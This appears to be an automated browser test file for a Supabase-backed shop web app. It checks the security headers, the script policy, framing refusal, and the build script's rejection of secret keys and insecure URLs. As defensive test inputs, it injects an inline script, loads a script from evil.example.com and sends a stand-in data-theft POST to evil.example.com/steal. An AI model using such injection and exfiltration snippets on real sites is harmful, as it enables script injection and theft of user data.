// The hosted site's protections, on the build that talks to https://demo.supabase.co (port 8098):
// security headers, the script policy blocking injected or outside scripts and outside connections,
// refusing to load in another site's frame, the build refusing secret keys and missing config,
// and a site built without config saying it isn't connected (port 8097).
import { spawnSync } from 'child_process'; import path from 'path'; import fs from 'fs'; import { fileURLToPath } from 'url';
import { browser, errs, finish, ok, done } from './support/phone.mjs';
const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const H = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' };
const STORE = { shop: { name: 'Downtime', tagline: 'goods by SB.co', about: 'Hello', extend_minutes: 2 }, now: new Date().toISOString(), live: [], sold: [] };

const ctx = await browser.newContext({ viewport: { width: 390, height: 844 } });
const p = await ctx.newPage(); const viol = [];
p.on('pageerror', e => errs.push('csp: ' + e.message));
p.on('console', m => { if (/Content Security Policy|Refused to/i.test(m.text())) viol.push(m.text().slice(0, 200)); });
await p.addInitScript(() => document.addEventListener('securitypolicyviolation', e => (window.__v = window.__v || []).push(e.violatedDirective + ' ' + e.blockedURI)));
let calls = 0;
await ctx.route('https://demo.supabase.co/**', r => { calls++; const m = r.request().method(); if (m === 'OPTIONS') return r.fulfill({ status: 204, headers: H });
  return r.fulfill({ status: 200, headers: H, contentType: 'application/json', body: JSON.stringify(STORE) }); });
const resp = await p.goto('http://localhost:8098/'); await p.waitForTimeout(1200);
const h = resp.headers(), csp = h['content-security-policy'] || '';
ok('the app boots under its security policy and loads the shop', /Hello/.test(await p.innerText('#about')) && calls > 0);
ok('scripts: only the app’s own, by hash', /script-src 'self' 'sha256-[A-Za-z0-9+/=]+'(;|$)/.test(csp) && !/unsafe-inline[^;]*script|script-src[^;]*unsafe/.test(csp));
ok('connections and images: only this site and its Supabase project', /connect-src 'self' https:\/\/demo\.supabase\.co(;|$)/.test(csp) && /img-src 'self' data: blob: https:\/\/demo\.supabase\.co(;|$)/.test(csp));
ok('no framing, no sniffing, no referrer, HTTPS only', h['x-frame-options'] === 'DENY' && /frame-ancestors 'none'/.test(csp) && h['x-content-type-options'] === 'nosniff' && h['referrer-policy'] === 'no-referrer' && /max-age=31536000/.test(h['strict-transport-security'] || ''));
ok('the database address and publishable key are baked in', await p.evaluate(() => JSON.parse(document.getElementById('cloudConfig').textContent).url === 'https://demo.supabase.co'));
ok('no starter data block in the hosted page', !(await p.$('#baseData')));
const v0 = await p.evaluate(() => window.__v || []);
ok('the app itself causes no policy violations', v0.length === 0 && viol.length === 0, v0.concat(viol).join(' | '));
await p.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__pwned=1'; document.body.appendChild(s); }); await p.waitForTimeout(200);
ok('an injected inline script is blocked', await p.evaluate(() => window.__pwned === undefined));
await p.evaluate(() => { const s = document.createElement('script'); s.src = 'https://evil.example.com/x.js'; document.body.appendChild(s); }); await p.waitForTimeout(300);
ok('scripts from other sites are blocked', await p.evaluate(() => (window.__v || []).some(x => /evil\.example/.test(x))));
ok('sending data to other sites is blocked', (await p.evaluate(async () => { try { await fetch('https://evil.example.com/steal', { method: 'POST', body: 'x' }); return 'sent'; } catch (e) { return 'blocked'; } })) === 'blocked');
const f = await browser.newPage(); await f.setContent('<iframe src="http://localhost:8098/" id="f"></iframe>'); await f.waitForTimeout(1200);
ok('the shop refuses to load inside another site’s frame', await f.evaluate(() => { try { const d = document.getElementById('f').contentDocument; return !d || !d.querySelector('#grid'); } catch (e) { return true; } }));
ok('the service worker registers', await p.evaluate(async () => !!(await navigator.serviceWorker.getRegistration())));
const ver = await (await fetch('http://localhost:8099/version.json')).json();
ok('version.json says what’s deployed', /^\d+\.\d+/.test(ver.version) && ver.commit.startsWith('a1b2c3d') && ver.context === 'production');

// the build itself
const build = env => spawnSync('python3', ['build_pwa.py'], { cwd: repo, env: { PATH: process.env.PATH, ...env }, encoding: 'utf8' });
let r = build({ DOWNTIME_SUPABASE_URL: 'https://demo.supabase.co', DOWNTIME_SUPABASE_KEY: 'sb_secret_abcdefghijklmnopqrstuvwxyz' });
ok('the build refuses a secret key', r.status !== 0 && /SECRET key/.test(r.stdout + r.stderr));
r = build({ NETLIFY: 'true' });
ok('on Netlify, the build refuses to publish without the database settings', r.status !== 0 && /Missing DOWNTIME_SUPABASE_URL/.test(r.stdout + r.stderr));
r = build({ DOWNTIME_SUPABASE_URL: 'http://evil.example.com', DOWNTIME_SUPABASE_KEY: 'sb_publishable_demo_key_000000000000' });
ok('plain http is only allowed for localhost', r.status !== 0);
r = build({});
ok('a local build without settings still works', r.status === 0 && !/cloudConfig">\{"url/.test(fs.readFileSync(path.join(repo, 'pwa/index.html'), 'utf8')));
ok('.env and pwa/ are kept out of git', /^\.env$/m.test(fs.readFileSync(path.join(repo, '.gitignore'), 'utf8')) && /^pwa\/$/m.test(fs.readFileSync(path.join(repo, '.gitignore'), 'utf8')));

// a site built without the database settings says so instead of breaking
const b = await browser.newPage(); b.on('pageerror', e => errs.push('bare: ' + e.message));
await b.goto('http://localhost:8097/'); await b.waitForTimeout(600);
ok('without database settings the shop says it isn’t connected yet', /isn’t connected to its database yet/.test(await b.innerText('#banner')) && /Not connected yet/.test(await b.innerText('#grid')));

await finish(); await done(errs);
